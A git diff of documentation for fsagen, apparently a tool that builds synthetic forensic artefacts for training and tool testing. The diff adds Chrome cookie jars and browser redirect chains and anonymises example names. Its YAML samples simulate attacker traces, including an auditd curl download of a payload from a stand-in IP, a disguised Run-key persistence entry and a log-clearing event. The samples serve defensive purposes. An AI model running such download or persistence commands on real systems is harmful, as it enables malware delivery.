@@ -419,7 +419,7 @@ YAML with an optional `start` and a sequence of operations:
 | `content_kind` | what invented bytes look like — `text` (the default: base32), `bytes` (uniform random), `zeros`, `pattern` (a counting ramp) or `lorem` (words). It only applies to bytes fsagen invents, so giving it beside `content`, `content_file` or `template` is an error                                                                                                                                                                             |
 | `render`       | run `${...}` substitution over the content. Defaults to `true` for inline `content` and `false` for `content_file`, because scripts and PEM keys contain `${...}` sequences of their own that must survive verbatim                                                                                                                                                                                                                           |
 | `mode`         | octal file permissions, e.g. `"0600"` (default 0644 files, 0755 directories)                                                                                                                                                                                                                                                                                                                                                                  |
-| `format`       | what to build — `raw` (default) or `text` writes the content through; `pdf`, `docx`, `docm`, `xlsx`, `xlsm`, `pe`, `zip`, `png`, `jpeg`, `mp4`, `lnk`, `prefetch`, `evtx`, `regf`, `utmp`, `auditd`, `chrome_history` and `firefox_places` build a file of that type. With no `format` and no content of its own, the extension picks one (see _File formats_). For the `email` action, `eml` or `mbox`                                                                                                                    |
+| `format`       | what to build — `raw` (default) or `text` writes the content through; `pdf`, `docx`, `docm`, `xlsx`, `xlsm`, `pe`, `zip`, `png`, `jpeg`, `mp4`, `lnk`, `prefetch`, `evtx`, `regf`, `utmp`, `auditd`, `chrome_history`, `firefox_places` and `chrome_cookies` build a file of that type. With no `format` and no content of its own, the extension picks one (see _File formats_). For the `email` action, `eml` or `mbox`                                                                                                                    |
 
 **Typed blocks** — each belongs to one `format` or action, and is an error
 beside any other
@@ -431,7 +431,8 @@ beside any other
 | `xlsx`    | the same, for `format: xlsx` or `xlsm`                                                                           |
 | `vba`     | the inert macro of `format: docm` or `xlsm`: its entry point, module and marker — see _`vba:`_                   |
 | `pe`      | machine, subsystem, dll, timestamp, sections, imports and version resource for `format: pe` — see _File formats_ |
-| `history` | `visits` and (Chrome) `downloads` for `format: chrome_history` or `firefox_places` — see _File formats_          |
+| `history` | `visits` (with redirects) and (Chrome) `downloads` for `format: chrome_history` or `firefox_places` — see _File formats_ |
+| `cookies` | the cookies of `format: chrome_cookies` — see _`cookies:`_                                                       |
 | `lnk`     | the target and what the link records about it, for `format: lnk` — see _`lnk:`_                                  |
 | `prefetch` | the program, its runs and what it loaded, for `format: prefetch` — see _`prefetch:`_                            |
 | `evtx`    | the channel, computer and events, for `format: evtx` — see _`evtx:`_                                              |
@@ -449,8 +450,8 @@ beside any other
 | Field                                 | Meaning                                                                                                                                                                                                                                                                                                                                       |
 | ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `atime` `mtime` `ctime` `crtime`      | RFC 3339 access, modification, change and creation (birth) times, fractions of a second kept. They override what the action would otherwise set (see _Timestamps_). `ctime` needs Windows on NTFS or ReFS, or an ext4 or NTFS image, and `crtime` Windows or an image; elsewhere either is a pre-flight error unless `--on-unsupported=skip`, which drops the field and records that |
-| `stream`                              | ADS stream name (for the `ads` action, Windows-only)                                                                                                                                                                                                                                                                                          |
-| `zone_id`, `host_url`, `referrer_url` | for the `motw` action (Windows-only)                                                                                                                                                                                                                                                                                                          |
+| `stream`                              | ADS stream name (for the `ads` action: Windows on NTFS, or an NTFS image)                                                                                                                                                                                                                                                                     |
+| `zone_id`, `host_url`, `referrer_url` | for the `motw` action (Windows on NTFS, or an NTFS image)                                                                                                                                                                                                                                                                                      |
 
 A manifest may also carry a top-level `variables:` map.
 
@@ -583,7 +584,7 @@ Durations accept `d` and `w` in addition to Go's own units, so a step can be
 ```yaml
 variables:
   campaign_id: "OP-2024-001"
-  target_org: "ACME Corp"
+  target_org: "Example Corp"
 actors:
   - name: attacker
     base: users/victim/Downloads
@@ -672,20 +673,20 @@ Writes a `.eml`, or appends to a `.mbox` with mboxrd `>From` escaping.
 
 ```yaml
 - action: email
-  path: Users/priyan/Mail/Inbox/0003.eml
+  path: Users/employee/Mail/Inbox/0003.eml
   format: eml # or mbox (appends); inferred from the extension
   email:
-    from: "Dana Reyes <d.reyes@aperture-talent.example>"
-    to: ["Priyan N <priyan.nair@northwindlogistics.example>"]
-    cc: ["scheduling@aperture-talent.example"]
-    return_path: "bounces+0188@aperture-talent.example"
+    from: "Recruiter <recruiter@talent-agency.example>"
+    to: ["Employee <employee@corp.example>"]
+    cc: ["scheduling@talent-agency.example"]
+    return_path: "bounces+0188@talent-agency.example"
     subject: "Re: technical assessment"
     date: "2026-02-25T10:05:00+05:30" # RFC3339; also the file's times
-    message_id: "<c3f1a97b@aperture-talent.example>"
-    in_reply_to: "<b2e0d8f1@northwindlogistics.example>"
+    message_id: "<c3f1a97b@talent-agency.example>"
+    in_reply_to: "<b2e0d8f1@corp.example>"
     references: [
-      "<CAF9a2c1e@aperture-talent.example>",
-      "<b2e0d8f1@northwindlogistics.example>",
+      "<CAF9a2c1e@talent-agency.example>",
+      "<b2e0d8f1@corp.example>",
     ]
     headers: # an ordered LIST, so Received: can repeat
       - name: Received
@@ -756,8 +757,8 @@ a paginated PDF, with full control of the document metadata.
     author: "svc-agent@example.local"
     subject: "Automated assessment"
     keywords: "secrets; review"
-    creator: "SentinelIQ Threat Agent 2.1.4"
-    producer: "SentinelIQ Report Engine 2.1.4"
+    creator: "AnalysisSuite Threat Agent 2.1.4"
+    producer: "AnalysisSuite Report Engine 2.1.4"
     created: "2026-03-14T02:33:12+05:30" # RFC3339; pin these for
     modified: "2026-03-14T02:33:12+05:30" # byte-identical output
     page_size: A4 # A4 (default), A3, A5, Letter
@@ -1348,14 +1349,14 @@ separate manifests, so a hostname or a date is defined once.
 
 ```yaml
 # personas.yaml
-org: "Northwind Logistics"
-victim_host: "NWL-WKS-0417"
+org: "Example Corp"
+victim_host: "WKS-0417"
 t_report_generated: "2026-03-14T02:33:12+05:30"
 ```
 
 ```pwsh
 fsagen --seed 1414 --vars-file personas.yaml --manifest evidence-02.yaml ./out/02
-fsagen --seed 1414 --vars-file personas.yaml --var org="Acme" --manifest evidence-03.yaml ./out/03
+fsagen --seed 1414 --vars-file personas.yaml --var org="ExampleCorp" --manifest evidence-03.yaml ./out/03
 ```
 
 Precedence is `--var` > `--vars-file` > actor variables > playbook/manifest
@@ -1425,7 +1426,7 @@ support_; what fsagen cannot control at all, and what can disturb the output
 after the run, is in _Limits_.
 
 Verified by `TestCreateSetsCreationTime`, `TestMaceSetsFourTimes`,
-`TestMaceLeavesUnnamedTimes`, `TestQuilldropLiteStompCount`,
+`TestMaceLeavesUnnamedTimes`, `TestAcceptanceStompCount`,
 `TestAdsAndMotwKeepTimes`, `TestDirTimesFollowLastChildEvent`,
 `TestRotateKeepsRotatedTimes`, `TestCopySemantics`, `TestCopyCarriesStreams`,
 `TestEmailTimesFromDate`, `TestNanoPrecisionRoundTrip`,
@@ -1645,6 +1646,7 @@ type whose extension is ambiguous.
 | `pdf`            | _(explicit only)_           | a paginated PDF from a Markdown subset                                                                               | the document's text                 | see _`format: pdf`_                                                      |
 | `chrome_history` | _(explicit only)_           | Chrome's `meta`, `urls`, `visits`, `downloads`, `downloads_url_chains` and `keyword_search_terms`, with its indexes  | not accepted                        | SQLite + the queries a tool runs (`TestStandardHistorySQLReturnsVisits`) |
 | `firefox_places` | _(explicit only)_           | Firefox's `moz_origins`, `moz_places` (with `rev_host`) and `moz_historyvisits`, `user_version = 77`                 | not accepted                        | as above                                                                 |
+| `chrome_cookies` | _(explicit only)_           | Chromium's cookie store at version 24: `meta` and `cookies`, with its unique index                                   | not accepted                        | SQLite + the query Mutant's `browser_cookies` runs (see _`cookies:`_)     |
 | `text`, `raw`    | anything else               | the content, or filler, byte for byte                                                                                | the whole file                      | —                                                                        |
 
 `.pdf` is deliberately not inferred: a PDF's dates are settled while the
@@ -1745,6 +1747,85 @@ A history database is as big as its contents make it, so it takes no
 `content_len`. `examples/manifest-history.yaml` and
 `examples/playbook-browsing.yaml` are worked profiles.
 
+**Redirects.** A visit the browser was sent to rather than navigated to says
+so with `redirect: server` (an HTTP 3xx) or `redirect: client` (a meta
+refresh or a script), and names the visit it came from in `from_visit`. That
+makes a redirect chain, the way an ad network bounces a click on to its
+landing page. Chrome marks the chain's first visit `CHAIN_START`, its last
+`CHAIN_END` and each later hop `SERVER_REDIRECT` (`0x80000000`) or
+`CLIENT_REDIRECT` (`0x40000000`) in `transition`; a visit outside any chain
+carries both chain bits, as an ordinary click does. Firefox records a server
+redirect as `visit_type` 6 and has no type for a client one. A chain is a
+line: no visit is redirected onward twice (`TestRedirectChainTransitions`).
+
+A download reached through redirects lists every URL requested, first to
+last, in `url_chain`, ending at its `url`; Chrome keeps them in
+`downloads_url_chains`. `referrer`, `tab_url` and `tab_referrer_url` are the
+page that linked to it, the page the tab showed and the page that tab came
+from. With none of them a download records its own URL, as before
+(`TestDownloadURLChain`).
+
+```yaml
+    visits:
+      - url: https://news.example/
+        transition: typed
+      - url: https://clk.adnet.test/c?id=88 # the ad the user clicked
+        from_visit: 1
+      - url: https://rtb.adnet.test/r # the ad network's own redirect
+        from_visit: 2
+        redirect: server
+      - url: https://landing.example/update
+        from_visit: 3
+        redirect: server
+    downloads:
+      - url: https://landing.example/update.exe
+        target_path: C:\Users\u\Downloads\update.exe
+        url_chain:
+          [https://rtb.adnet.test/d, https://landing.example/update.exe]
+        referrer: https://landing.example/update
+        tab_url: https://landing.example/update
+```
+
+### `cookies:` — Chrome cookie jars
+
+`format: chrome_cookies` builds a Chromium profile's `Cookies` database, the
+cookie store at version 24 with its unique index. A tool reads which sites
+knew the browser was there from the host, name, path and times. By default
+the value is stored as Chrome stores it, encrypted: `value` is empty and
+`encrypted_value` holds `v10`, a 12-byte nonce, a ciphertext as long as the
+value and a 16-byte tag. Those bytes come from the seed and no key stands
+behind them, which is what a tool sees of a jar copied without its
+`Local State`. `plaintext: true` writes the values in the clear instead.
+
+```yaml
+- action: create
+  path: Users/u/AppData/Local/Google/Chrome/User Data/Default/Cookies
+  format: chrome_cookies
+  cookies:
+    entries:
+      - host: .adnet.test # a leading dot: every subdomain receives it
+        name: uid
+        value: a1b2c3
+        created: "2026-03-11T09:16:01Z" # defaults to the action's time
+        expires: "2027-03-11T09:16:01Z" # none makes a session cookie
+        secure: true
+        samesite: none # unspecified (default), none, lax or strict
+      - host: landing.example # host-only
+        name: session
+        value: s3ss10n
+        httponly: true
+        path: / # the default
+        last_access: "2026-03-11T09:17:00Z" # defaults to created
+```
+
+A jar refuses a cookie with no host or name, a host written as a URL, a path
+not starting with `/`, an expiry before its creation, and two cookies Chrome's
+unique index would refuse (the same host, name, path and scheme). It is as
+big as its cookies make it, so it takes no `content_len`.
+`TestCookieJarReadsAsAToolReadsIt` runs the query Mutant's `browser_cookies`
+runs and gets every cookie back; `TestCookieJarSchema` pins the columns
+against Chromium's own.
+
 ### `vba:` — macro-enabled documents
 
 A `.docm` or `.xlsm` carries a VBA project with exactly one macro, and that
@@ -1827,7 +1908,7 @@ tool reports where the target was, when, on which volume and on which machine.
     drive_type: removable # fixed (default), removable, cdrom, ramdisk
     volume_serial: 1A2B-3C4D # default: drawn from the seed
     volume_label: USBSTICK
-    machine_id: DESKTOP-QUILL # default: DESKTOP- and 7 characters from the seed
+    machine_id: DESKTOP-LAB01 # default: DESKTOP- and 7 characters from the seed
     target_crtime: "2024-03-15T09:00:00Z" # target_crtime, _atime and _mtime
     target_mtime: "2024-03-15T11:00:00Z" # default to the action's time
     target_size: 48213
@@ -1917,12 +1998,12 @@ once per chunk and filled with the event's values. Every CRC is right.
       - event_id: 4624 # built in: provider, version, task, keywords and the
         time: "2024-03-15T08:59:00Z" # names and types of its data are Windows' own
         data:
-          TargetUserName: alice
+          TargetUserName: user1
           TargetDomainName: CORP
           LogonType: 10
           IpAddress: 203.0.113.7
       - event_id: 1102 # the log was cleared
-        data: { SubjectUserName: alice }
+        data: { SubjectUserName: user1 }
       - event_id: 1000 # any other event names its provider; its data are strings
         provider: Application Error
         level: 2
@@ -1956,7 +2037,7 @@ comes from its name, and decides where the artefacts below go.
 
 ```yaml
 - action: create
-  path: C/Users/alice/NTUSER.DAT # the name implies format: regf
+  path: C/Users/user1/NTUSER.DAT # the name implies format: regf
   registry:
     keys:
       - path: 'Software\Sysinternals\PsExec'
@@ -1967,15 +2048,15 @@ comes from its name, and decides where the artefacts below go.
           - { name: Blob, type: REG_BINARY, data: "de ad be ef" }
           - { name: Paths, type: REG_MULTI_SZ, strings: [a, b] }
     run: # NTUSER.DAT or SOFTWARE
-      - { name: SystemUpdate, command: 'C:\Users\alice\AppData\Local\Temp\wupdmgr32.exe' }
+      - { name: SystemUpdate, command: 'C:\Users\user1\AppData\Local\Temp\wupdmgr32.exe' }
     userassist: # NTUSER.DAT
       - { path: 'C:\Windows\System32\cmd.exe', run_count: 4, focus_time_ms: 61000, last_run: "2024-03-15T09:30:00Z" }
 - action: create
   path: C/Windows/System32/config/SYSTEM
   registry:
     usbstor: # SYSTEM
-      - vendor: SanDisk
-        product: Cruzer Blade
+      - vendor: Generic
+        product: Storage Unit
         revision: "1.00"
         serial: 4C530001231117116491
         first_install: "2024-03-14T08:00:00Z" # first_install and last_arrival
@@ -2015,7 +2096,7 @@ same on amd64 and arm64. Its times are 32-bit, so nothing after
   utmp:
     records:
       - { type: boot, time: "2024-03-15T08:00:00Z" } # host: the kernel release
-      - { type: login, user: alice, line: pts/0, host: 203.0.113.7 }
+      - { type: login, user: user1, line: pts/0, host: 203.0.113.7 }
       - { type: logout, line: pts/0, time: "2024-03-15T10:00:00Z" }
       - { type: shutdown, time: "2024-03-15T11:00:00Z" }
 - action: create
@@ -2027,9 +2108,9 @@ same on amd64 and arm64. Its times are 32-bit, so nothing after
   path: var/log/audit/audit.log # the name implies format: auditd
   auditd:
     events: # each a second after the last, unless timed
-      - { type: auth, user: alice, host: 203.0.113.7 }
-      - { type: login, user: alice, host: 203.0.113.7 }
-      - { type: execve, user: alice, argv: [curl, -o, /tmp/x, 'http://198.51.100.42/p'], key: exec }
+      - { type: auth, user: user1, host: 203.0.113.7 }
+      - { type: login, user: user1, host: 203.0.113.7 }
+      - { type: execve, user: user1, argv: [curl, -o, /tmp/x, 'http://198.51.100.42/p'], key: exec }
 ```
 
 - In a playbook a record or event that names no user is the actor's.
@@ -2065,8 +2146,8 @@ object exists, so a pattern can never sweep the archive into itself.
     member_refs: [mail, media] # every live path created under these ids,
     # in creation order
     members: # then glob patterns, in path order
-      - "users/alice/staging/*.csv"
-    base: users/alice/staging # stripped from each stored name
+      - "users/user1/staging/*.csv"
+    base: users/user1/staging # stripped from each stored name
 ```
 
 `member_refs` come first, in the order the files were created, then `members`,
@@ -2204,7 +2285,7 @@ an error, never a silent fall-back):
 file system keeps one), `lstat` on macOS and FreeBSD (built, never run)
 (`TestBodyfileCrtimeNotCtime`, `TestLinuxBtimeFromStatxOrZero`). Every named
 stream is its own entry, with its size and MD5 and its file's times
-(`TestStreamsQuillAndSpaceNameWithSizes`). The inode is the NTFS MFT record
+(`TestStreamsNamedAndSpaceNameWithSizes`). The inode is the NTFS MFT record
 number on Windows and the inode number on Unix; UID and GID are the owner on
 Unix and 0 on Windows. On Windows the mode is written as The Sleuth Kit writes
 it for NTFS (`rwxrwxrwx`, less the write bits of a read-only file).
@@ -2407,7 +2488,7 @@ the capabilities of a Windows NTFS volume and checks the Windows goldens, byte
 for byte, on any platform.
 
 `docs/testing.md` maps every finding in `plan.json` to the test that closes it.
-`TestConsumerAcceptance` runs `testdata/acceptance/quilldrop-lite.playbook.yaml`
+`TestConsumerAcceptance` runs `testdata/acceptance/invoice-lure.playbook.yaml`
 and checks the eleven things fsagen's first consumer asked for, from a parseable
 phishing message to a real gap in a beacon log.
 
